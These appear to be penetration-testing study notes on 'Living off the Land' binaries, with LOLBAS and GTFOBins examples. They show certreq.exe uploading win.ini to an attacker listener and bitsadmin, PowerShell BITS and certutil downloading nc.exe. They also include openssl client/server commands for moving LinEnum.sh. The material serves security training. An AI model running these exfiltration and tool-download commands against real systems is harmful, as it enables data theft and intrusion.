# 🏞️ Living Off the Land (LOLBins)

> [!info]+ 📌 What Does "Living Off the Land" Mean?  
> **Living off the Land (LotL)** means using tools and binaries that are **already present on the target system** to perform actions beyond their original intended purpose.
> 
> The idea was coined by **Christopher Campbell (@obscuresec)** and **Matt Graeber (@mattifestation)** at DerbyCon 3.
> 
> ```text
> 🎯 Target System
>       │
>       ▼
> 🧰 Existing / Built-in Tools
>       │
>       ▼
> 💻 Perform Useful Actions
> ```
> 
> Instead of bringing a new tool onto the machine, we can sometimes use something that is already installed.

---

# 🧩 1️⃣ LOLBins

**LOLBins** = **Living Off the Land Binaries**

These are legitimate binaries that can potentially be used for purposes beyond their original design.

They can provide functionality such as:

|Function|Description|
|---|---|
|📥 Download|Retrieve files|
|📤 Upload|Send files|
|⚙️ Command Execution|Execute commands|
|📖 File Read|Read file contents|
|✍️ File Write|Write files|
|🛡️ Bypasses|Assist with certain security-control bypasses|

```text
                 🧰 LOLBin
                    │
       ┌────────────┼────────────┐
       ▼            ▼            ▼
     📥 Download  📤 Upload   ⚙️ Execute
       │            │            │
       └────────────┼────────────┘
                    ▼
               🎯 Target
```

---

# 🌐 2️⃣ LOLBAS & GTFOBins

There are two major resources for finding these binaries:

### 🪟 LOLBAS

**LOLBAS** focuses on **Windows binaries**.

```text
🪟 Windows
    │
    ▼
🔎 LOLBAS
    │
    ▼
🧰 Find useful binaries
```

### 🐧 GTFOBins

**GTFOBins** focuses on **Unix/Linux binaries**.

```text
🐧 Linux
    │
    ▼
🔎 GTFOBins
    │
    ▼
🧰 Find useful binaries
```

> [!tip]+ ⚡ Search Functions  
> In **LOLBAS**, searches can be performed using:
> 
> ```text
> /download
> /upload
> ```
> 
> In **GTFOBins**, the material uses:
> 
> ```text
> +file download
> +file upload
> ```

---

# 🪟 3️⃣ Windows — LOLBAS

## 📤 CertReq.exe

The material uses **`certreq.exe`** as an example of a Windows LOLBin capable of performing an upload operation.

The general flow is:

```text
🪟 Windows Target
      │
      │ certreq.exe
      │ HTTP POST
      ▼
🌐 HTTP Server
      │
      ▼
🐚 Netcat Listener
```

---

# 📤 4️⃣ Uploading a File with CertReq

First, a listener is started on the receiving machine.

```bash
sudo nc -lvnp 8000
```

Then `certreq.exe` is used on the Windows system:

```cmd
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

> [!info]+ 🧠 What's Happening?  
> `certreq.exe` sends the contents of `win.ini` to the specified HTTP endpoint using an HTTP `POST` request.
> 
> The receiving Netcat session captures the HTTP request and the file contents.

```text
C:\Windows\win.ini
       │
       ▼
📤 certreq.exe
       │
       │ HTTP POST
       ▼
192.168.49.128:8000
       │
       ▼
🐚 nc -lvnp 8000
       │
       ▼
📄 File Contents
```

---

# 📥 5️⃣ Receiving the File with Netcat

On the receiving machine:

```bash
sudo nc -lvnp 8000
```

The connection may look similar to:

```text
listening on [any] 8000 ...
connect to [192.168.49.128] ...
POST / HTTP/1.1
...
Content-Length: 92
Host: 192.168.49.128:8000

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

> [!note]+ 🧠 Important  
> In this example, `certreq.exe` may report a timeout:
> 
> ```text
> ERROR_WINHTTP_TIMEOUT
> ```
> 
> even though the HTTP request and file contents were received by the listener.

---

# ⚠️ 6️⃣ CertReq Version Issue

> [!warning]+ 🚨 `-Post` Parameter  
> If `certreq.exe` returns an error indicating that the `-Post` parameter isn't available, the version being used may not support it.
> 
> The material recommends obtaining a version that contains the required functionality.

```text
certreq.exe
     │
     ├── Version supports -Post
     │       └── ✅ Example works
     │
     └── Version doesn't support -Post
             └── ❌ Try another version
```

---

# 🐧 7️⃣ Linux — GTFOBins

For Linux/Unix systems, the equivalent resource is **GTFOBins**.

The material uses **OpenSSL** as an example.

```text
🐧 Linux Target
      │
      ▼
🔎 GTFOBins
      │
      ▼
🧰 OpenSSL
      │
      ▼
📥 File Transfer
```

> [!info]+ 📌 Why OpenSSL?  
> OpenSSL is frequently installed on Linux systems and is commonly used for security certificates.
> 
> It can also be used to transfer files in an **"nc style"** manner.

---

# 🔐 8️⃣ Create a Certificate

Before starting the OpenSSL server, create a certificate and private key:

```bash
openssl req -newkey rsa:2048 -nodes \
-keyout key.pem \
-x509 -days 365 \
-out certificate.pem
```

### 📦 Files Created

```text
openssl req
     │
     ├── 🔑 key.pem
     │
     └── 📜 certificate.pem
```

### 🧩 Important Options

|Option|Purpose|
|---|---|
|`req`|Certificate request utility|
|`-newkey rsa:2048`|Generate a new 2048-bit RSA key|
|`-nodes`|Don't encrypt the private key|
|`-keyout key.pem`|Output private key|
|`-x509`|Generate a self-signed certificate|
|`-days 365`|Certificate validity|
|`-out certificate.pem`|Output certificate|

---

# 🌐 9️⃣ Start the OpenSSL Server

On the receiving machine:

```bash
openssl s_server -quiet \
-accept 80 \
-cert certificate.pem \
-key key.pem \
< /tmp/LinEnum.sh
```

```text
/tmp/LinEnum.sh
      │
      ▼
🔐 OpenSSL s_server
      │
      │ TLS
      ▼
🌐 Port 80
```

> [!note]+ 🧠 Key Idea  
> The file is supplied to the OpenSSL server through standard input:
> 
> ```bash
> < /tmp/LinEnum.sh
> ```
> 
> This allows the file's contents to be sent through the connection.

---

# 📥 🔟 Download the File

From the target machine:

```bash
openssl s_client \
-connect 10.10.10.32:80 \
-quiet > LinEnum.sh
```

### 🔄 Complete Flow

```text
              🐧 Receiving Host
                     │
                     ▼
             🔐 openssl s_server
                     │
                     │ TLS
                     ▼
                  🌐 :80
                     │
                     ▼
              🐧 Target Host
                     │
                     ▼
             openssl s_client
                     │
                     ▼
                LinEnum.sh
```

---

# 🪟 1️⃣1️⃣ BITSAdmin

Another Windows built-in utility discussed is:

```text
bitsadmin
```

### 📌 BITS

**BITS = Background Intelligent Transfer Service**

BITS can transfer files from:

- 🌐 HTTP sites
    
- 📁 SMB shares
    

It is designed to consider host and network utilization to minimize the impact on foreground user activity.

---

# 📥 1️⃣2️⃣ Download with BITSAdmin

```powershell
bitsadmin /transfer wcb /priority foreground \
http://10.10.15.66:8000/nc.exe \
C:\Users\htb-student\Desktop\nc.exe
```

### 🔄 Transfer

```text
🌐 HTTP Server
      │
      │ nc.exe
      ▼
🪟 BITSAdmin
      │
      ▼
C:\Users\htb-student\Desktop\nc.exe
```

---

# 🟦 1️⃣3️⃣ PowerShell + BITS

PowerShell can also interact with BITS.

First:

```powershell
Import-Module bitstransfer
```

Then:

```powershell
Start-BitsTransfer `
-Source "http://10.10.10.32:8000/nc.exe" `
-Destination "C:\Windows\Temp\nc.exe"
```

### 🧠 Capabilities

According to the material, PowerShell's BITS functionality supports:

- 📥 Downloads
    
- 📤 Uploads
    
- 🔑 Credentials
    
- 🌐 Specified proxy servers
    

---

# 🪟 1️⃣4️⃣ Certutil

Another well-known Windows built-in utility is:

```text
certutil.exe
```

> [!info]+ 📌 Certutil  
> The material explains that **Certutil** can download arbitrary files and is available across Windows versions.
> 
> Because of this, it became a popular file-transfer technique and was sometimes treated as a de facto **`wget` for Windows**.

---

# 📥 1️⃣5️⃣ Download with Certutil

```cmd
certutil.exe -verifyctl -split -f \
http://10.10.10.32:8000/nc.exe
```

### 🔄 Flow

```text
🌐 HTTP Server
      │
      │ nc.exe
      ▼
🪟 certutil.exe
      │
      ▼
💾 Local File
```

---

# 🛡️ 1️⃣6️⃣ Detection Consideration

> [!warning]+ 🚨 Certutil Is Detectable  
> The material specifically notes that **AMSI (Antimalware Scan Interface)** currently detects malicious use of Certutil.
> 
> ```text
> certutil.exe
>      │
>      ▼
> 📥 File Download
>      │
>      ▼
> 🛡️ AMSI
>      │
>      ▼
> 🚨 Potential Detection
> ```
> 
> This is an important reminder:
> 
> **Built-in ≠ invisible.**

---

# 🧠 1️⃣7️⃣ Why Living Off the Land Matters

> [!important]+ 🎯 Core Concept  
> LotL techniques are valuable because they can allow operations to be performed using software that is **already present on the target system**.
> 
> ```text
> ❌ Bring custom tool
>        │
>        ▼
> 📦 Additional File
>        │
>        ▼
> 🛡️ More Things to Detect
> 
>          VS
> 
> ✅ Existing Binary
>        │
>        ▼
> 🧰 Built-in Functionality
>        │
>        ▼
> 🎯 Perform Operation
> ```
> 
> This concept appears repeatedly throughout penetration-testing activities, including file transfers, privilege escalation, and Active Directory enumeration/exploitation.

---

# 🆚 1️⃣8️⃣ LOLBAS vs GTFOBins

||🪟 LOLBAS|🐧 GTFOBins|
|---|---|---|
|Platform|Windows|Linux / Unix|
|Focus|Windows binaries|Unix binaries|
|Example|`certreq.exe`|`openssl`|
|File Download|✅|✅|
|File Upload|✅|✅|
|Other capabilities|Execution, read/write, bypasses|Various Unix binary capabilities|
|Main idea|Use existing Windows binaries|Use existing Unix binaries|

---

# ⚡ 1️⃣9️⃣ Quick Reference

### 🪟 CertReq Upload

```cmd
certreq.exe -Post -config http://<ATTACKER>:8000/ <FILE>
```

### 🐚 Netcat Listener

```bash
sudo nc -lvnp 8000
```

### 🐧 Create OpenSSL Certificate

```bash
openssl req -newkey rsa:2048 -nodes \
-keyout key.pem -x509 -days 365 \
-out certificate.pem
```

### 🌐 OpenSSL Server

```bash
openssl s_server -quiet \
-accept 80 \
-cert certificate.pem \
-key key.pem < /tmp/<FILE>
```

### 📥 OpenSSL Client

```bash
openssl s_client \
-connect <SERVER>:80 \
-quiet > <FILE>
```

### 🪟 BITSAdmin Download

```powershell
bitsadmin /transfer wcb /priority foreground `
http://<SERVER>:8000/<FILE> `
C:\Path\<FILE>
```

### 🟦 PowerShell BITS

```powershell
Import-Module bitstransfer

Start-BitsTransfer `
-Source "http://<SERVER>:8000/<FILE>" `
-Destination "C:\Path\<FILE>"
```

### 🪟 Certutil Download

```cmd
certutil.exe -verifyctl -split -f `
http://<SERVER>:8000/<FILE>
```

---

# 🧠 2️⃣0️⃣ Mental Model

> [!success]+ 🎯 Remember This

```text
                 🏞️ LIVING OFF THE LAND
                           │
                 ┌─────────┴─────────┐
                 ▼                   ▼
             🪟 Windows           🐧 Linux
                 │                   │
                 ▼                   ▼
              LOLBAS             GTFOBins
                 │                   │
        ┌────────┼────────┐          │
        ▼        ▼        ▼          ▼
     certreq   BITS    certutil   OpenSSL
        │        │        │          │
        └────────┴────────┴──────────┘
                         │
                         ▼
                    📦 File Transfer
```

> [!quote]+ 💡 The Big Picture  
> ==Living off the Land means leveraging what is already there.==
> 
> Rather than assuming you can install or transfer your preferred utility, learn to recognize what functionality existing binaries can provide.
> 
> ```text
> 🎯 Goal
>   │
>   ▼
> 🔎 Find Existing Binary
>   │
>   ▼
> 🧰 Identify Capability
>   │
>   ├── 📥 Download
>   ├── 📤 Upload
>   ├── 📖 Read
>   ├── ✍️ Write
>   └── ⚙️ Execute
>   │
>   ▼
> 🛡️ Consider Detection
> ```
> 
> **Windows → LOLBAS**  
> **Linux/Unix → GTFOBins**
> 
> And remember: **a legitimate built-in binary can still be monitored or detected when used in a suspicious way.**